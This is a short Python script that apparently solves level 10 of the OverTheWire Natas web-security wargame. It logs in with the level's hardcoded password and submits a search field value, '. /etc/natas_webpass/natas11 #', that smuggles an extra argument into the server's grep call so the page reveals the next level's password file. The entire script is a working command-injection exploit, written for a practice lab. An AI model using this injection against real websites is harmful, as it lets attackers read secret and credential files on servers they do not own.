#!/usr/bin/env python3

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.post(url, data = { "needle": ". /etc/natas_webpass/natas11 #", "submit": "submit" }, auth = (username, password))
content = response.text

print(re.findall('<pre>\n(.*)\n</pre>', content)[0])